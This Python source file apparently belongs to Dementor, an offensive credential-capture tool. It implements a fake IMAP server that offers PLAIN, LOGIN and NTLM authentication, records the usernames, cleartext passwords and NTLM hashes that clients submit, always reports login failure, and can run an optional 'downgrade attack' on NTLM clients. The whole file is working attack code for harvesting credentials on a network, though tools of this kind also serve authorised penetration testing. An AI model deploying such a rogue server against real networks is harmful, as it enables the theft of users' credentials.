# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: reportUninitializedInstanceVariable=false
#
# - [MS-OXIMAP]:
#    https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oximap4/b0f9d5f1-ac42-4b27-a874-0c3bf9e3b9b5
# - RFC-9501:
#    https://www.ietf.org/rfc/rfc9051.html
import base64
import binascii
import shlex
import typing

from typing import Literal, overload
from typing_extensions import override
from impacket import ntlm

from dementor.config.session import SessionConfig
from dementor.loader import BaseProtocolModule, DEFAULT_ATTR
from dementor.protocols.ntlm import (
    ntlm_build_challenge_message,
    ntlm_handle_authenticate_message,
    ntlm_handle_negotiate_message,
)
from dementor.servers import (
    ServerThread,
    ThreadingTCPServer,
    BaseProtoHandler,
    create_tls_context,
    BaseServerThread,
)
from dementor.log.logger import ProtocolLogger
from dementor.db import CLEARTEXT
from dementor.config.toml import (
    TomlConfig,
    Attribute as A,
)
from dementor.config.attr import ATTR_TLS, ATTR_CERT, ATTR_KEY
from dementor.config.util import HostValue, HostFallbackValue

__proto__ = ["IMAP"]


IMAP_CAPABILITIES = [
    # NOTE: support STARTTLS is currently not avaialble
    # "STARTTLS",
    "IMAP4rev2",
    "IMAP4rev1",
]

IMAP_AUTH_MECHS = ["PLAIN", "LOGIN", "NTLM"]


class IMAPServerConfig(TomlConfig):
    _section_ = "IMAP"
    _fields_ = [
        A("imap_port", "Port"),
        A(
            "imap_fqdn",
            "Host",
            None,
            section_local=False,
            factory=HostFallbackValue(HostValue.HOST, "DEMENTOR"),
        ),
        A("imap_caps", "Capabilities", IMAP_CAPABILITIES),
        A("imap_auth_mechanisms", "AuthMechanisms", IMAP_AUTH_MECHS),
        A("imap_banner", "Banner", "IMAP4rev2 service ready"),
        A("imap_downgrade", "Downgrade", True),
        ATTR_KEY,
        ATTR_CERT,
        ATTR_TLS,
    ]

    if typing.TYPE_CHECKING:
        imap_port: int
        imap_fqdn: str
        imap_caps: list[str]
        imap_auth_mechanisms: list[str]
        imap_banner: str
        imap_downgrade: bool


class IMAP(BaseProtocolModule[IMAPServerConfig]):
    name: str = "IMAP"
    config_ty = IMAPServerConfig
    config_attr = DEFAULT_ATTR
    config_enabled_attr = DEFAULT_ATTR
    config_list = True

    @override
    def create_server_thread(
        self, session: SessionConfig, server_config: IMAPServerConfig
    ) -> BaseServerThread[IMAPServerConfig]:
        return ServerThread(
            session,
            server_config,
            IMAPServer,
            server_address=(session.bind_address, server_config.imap_port),
            include_server_config=True,
        )


class StopHandler(Exception):
    pass


class IMAPHandler(BaseProtoHandler):
    def __init__(
        self, config, server_config: IMAPServerConfig, request, client_address, server
    ) -> None:
        self.server_config: IMAPServerConfig = server_config
        self.seq_id = None
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "IMAP",
                "protocol_color": "honeydew2",
                "host": self.client_host,
                "port": self.server_config.imap_port,
            }
        )

    def _push(self, msg: str, seq=True) -> None:
        line = str(msg)
        if seq and self.seq_id:
            line = f"{self.seq_id} {line}"
        elif not seq:
            line = f"* {line}"
        self._write_line(line)

    def _write_line(self, msg: str) -> None:
        self.logger.debug(f"S: {msg!r}")
        self.send(f"{msg}\r\n".encode("utf-8", "strict"))

    #  There are three possible server completion responses:
    #   - OK (indicating success),
    #   - NO (indicating failure), or
    #   - BAD (indicating a protocol error such as unrecognized command or
    #          command syntax error).
    def ok(self, msg: str, seq: bool = True) -> None:
        self._push(f"OK {msg}", seq)

    def no(self, msg: str, seq: bool = True) -> None:
        self._push(f"NO {msg}", seq)

    def bad(self, msg: str, seq: bool = True) -> None:
        self._push(f"BAD {msg}", seq)

    def unquoted(self, data: str) -> str:
        # A quoted string is a sequence of zero or more Unicode characters, excluding
        # CR and LF, encoded in UTF-8, with double quote (<">) characters at each end.
        return data.removeprefix('"').removesuffix('"')

    @overload
    def challenge_auth(
        self,
        token: bytes | None = ...,
        decode: Literal[False] = ...,
        prefix: str | None = ...,
    ) -> bytes: ...

    @overload
    def challenge_auth(
        self,
        token: bytes | None = ...,
        decode: Literal[True] = ...,
        prefix: str | None = ...,
    ) -> str: ...

    def challenge_auth(
        self,
        token: bytes | None = None,
        decode: bool = False,
        prefix: str | None = None,
    ) -> bytes | str:
        #  6.2.2. AUTHENTICATE Command
        line = prefix or "+"
        if token:
            line = f"{line} {base64.b64encode(token).decode()}"

        self._write_line(line)
        resp = self.rfile.readline(1024).strip()
        self.logger.debug(f"C: {resp!r}")
        if resp == b"*":
            self.bad("Authentication canceled")
            raise StopHandler

        try:
            data = base64.b64decode(resp)
        except binascii.Error:
            self.bad("Invalid base64 string")
            raise StopHandler from None

        return data if not decode else data.decode("utf-8", errors="replace")

    def send_greeting(self):
        # 7.1.1.  OK Response
        self.ok(self.server_config.imap_banner, seq=False)

    def handle_data(self, data, transport) -> None:
        #  The initial state is identified in the server greeting.
        self.send_greeting()
        self.request.settimeout(2)
        self.rfile = transport.makefile("rb")

        # 3.1. Not Authenticated State
        while line := self.recv_line(1024):
            try:
                tag, cmd, *args = shlex.split(line)
                self.seq_id = tag
            except ValueError:
                self.logger.debug(f"Unknown command: {line.encode()!r}")
                self.bad("Invalid command")
                continue

            method = getattr(self, f"do_{cmd.upper()}", None)
            if method:
                try:
                    method(args)
                except StopHandler:
                    break
            else:
                self.logger.debug(f"Unknown command: {line.encode()!r}")
                #  7.1.5. BYE Response
                self._push("BYE Unknown command", seq=False)
                break

    def recv_line(self, size: int) -> str | None:
        data = self.rfile.readline(size)
        if data:
            text = data.decode("utf-8", errors="replace").strip()
            self.logger.debug(f"C: {data!r}")
            return text

    # implementation
    #  7.2.2. CAPABILITY Response
    def do_CAPABILITY(self, args: list[str]) -> None:
        self.logger.display(f"Capabilities requested from {self.client_host}")
        capabilities = ["CAPABILITY", *self.server_config.imap_caps]
        capabilities.extend(f"AUTH={x}" for x in self.server_config.imap_auth_mechanisms)
        self._push(" ".join(capabilities), seq=False)
        self.ok("CAPABILITY completed")

    #  6.1.2. NOOP Command
    def do_NOOP(self, args: list[str]) -> None:
        self.ok("NOOP completed")

    #  6.4.1. CLOSE Command
    def do_CLOSE(self, args: list[str]) -> None:
        self.ok("CLOSE completed")
        raise StopHandler

    #  6.2.3. LOGIN Command
    def do_LOGIN(self, args: str) -> None:
        if len(args) != 2:
            return self.bad("Invalid number of arguments")

        username, password = args
        self.config.db.add_auth(
            client=self.client_address,
            username=self.unquoted(username),
            password=self.unquoted(password),
            logger=self.logger,
            credtype=CLEARTEXT,
        )
        self.no("LOGIN failed")

    #  6.2.2. AUTHENTICATE Command
    def do_AUTHENTICATE(self, args: list[str]) -> None:
        if len(args) < 1:
            return self.bad("Invalid number of arguments")

        auth_mechanism = self.unquoted(args[0].upper())
        method = getattr(self, f"auth_{auth_mechanism}", None)
        if method:
            method(*args[1:])
        else:
            self.bad("Unknown authentication mechanism")

    #  6.2.1. STARTTLS Command
    def do_STARTTLS(self, args: list[str]) -> None:
        self.no("STARTTLS not supported")

    # [MS-OXIMAP] 2.2.1 IMAP4 NTLM
    def auth_NTLM(self, initial_response: bytes | None = None) -> None:
        # IMAP4_AUTHENTICATE_NTLM_Supported_Response
        if not initial_response:
            token = self.challenge_auth()
        else:
            try:
                token = base64.b64decode(initial_response)
            except binascii.Error:
                return self.bad("Invalid Base64 encoding")

        # IMAP4_AUTHENTICATE_NTLM_Blob_Command
        negotiate = ntlm.NTLMAuthNegotiate()
        try:
            negotiate.fromString(token)
        except Exception as e:
            self.logger.debug(f"NTLM negotiation failed: {e}")
            return self.bad("NTLM negotiation failed")

        # IMAP4_AUTHENTICATE_NTLM_Blob_Response
        negotiate_fields = ntlm_handle_negotiate_message(negotiate, self.logger)
        host = HostValue(self.server_config.imap_fqdn)
        challenge = ntlm_build_challenge_message(
            negotiate,
            challenge=self.config.ntlm_challenge,
            nb_computer=host.get_value(HostValue.NETBIOS_COMPUTER),
            nb_domain=host.get_value(HostValue.NETBIOS_DOMAIN),
            disable_ess=self.config.ntlm_disable_ess,
            disable_ntlmv2=self.config.ntlm_disable_ntlmv2,
            target_type=self.config.ntlm_target_type,
            version=self.config.ntlm_version,
            dns_computer=host.get_value(HostValue.DNS_COMPUTER),
            dns_domain=host.get_value(HostValue.DNS_DOMAIN),
            # REVISIT: capture DNSTree too
            # dns_tree=self.config.ntlm_dns_tree,
            log=self.logger,
        )

        # IMAP4_AUTHENTICATE_NTLM_Blob_Command
        token = self.challenge_auth(challenge.getData())
        auth_message = ntlm.NTLMAuthChallengeResponse()
        try:
            auth_message.fromString(token)
        except Exception as e:
            self.logger.debug(f"NTLM authentication failed: {e}")
            return self.bad("NTLM authentication failed")

        ntlm_handle_authenticate_message(
            auth_message,
            challenge=self.config.ntlm_challenge,
            client=self.client_address,
            logger=self.logger,
            session=self.config,
            negotiate_fields=negotiate_fields,
        )

        if self.server_config.imap_downgrade:
            self.logger.display(f"Performing downgrade attack on {self.client_host}")
            return self.no("Authentication failed")

        self.ok("AUTHENTICATE completed")

    def auth_PLAIN(self, initial_response: bytes | None = None) -> None:
        if initial_response:
            login_and_password = base64.b64decode(initial_response)
        else:
            login_and_password = self.challenge_auth()

        # 2.  PLAIN SASL Mechanism
        try:
            _, login, password = login_and_password.split(b"\x00")
        except ValueError:
            return self.bad("Invalidlogin data")

        self.config.db.add_auth(
            client=self.client_address,
            username=login.decode(errors="replace"),
            password=password.decode(errors="replace"),
            logger=self.logger,
            credtype=CLEARTEXT,
        )
        self.no("LOGIN failed")

    def auth_LOGIN(self) -> None:
        username = self.challenge_auth(decode=True)
        password = self.challenge_auth(decode=True)
        self.config.db.add_auth(
            client=self.client_address,
            username=username,
            password=password,
            logger=self.logger,
            credtype=CLEARTEXT,
        )
        self.no("LOGIN failed")


class IMAPServer(ThreadingTCPServer):
    default_port = 143
    default_handler_class = IMAPHandler
    service_name = "IMAP"

    def __init__(
        self,
        config,
        server_address=None,
        RequestHandlerClass: type | None = None,
        server_config: IMAPServerConfig | None = None,
    ) -> None:
        self.server_config = server_config
        super().__init__(config, server_address, RequestHandlerClass)
        self.ssl_context = create_tls_context(self.server_config, self)
        if self.ssl_context:
            self.socket = self.ssl_context.wrap_socket(self.socket, server_side=True)

    def finish_request(self, request, client_address) -> None:
        self.RequestHandlerClass(
            self.config, self.server_config, request, client_address, self
        )
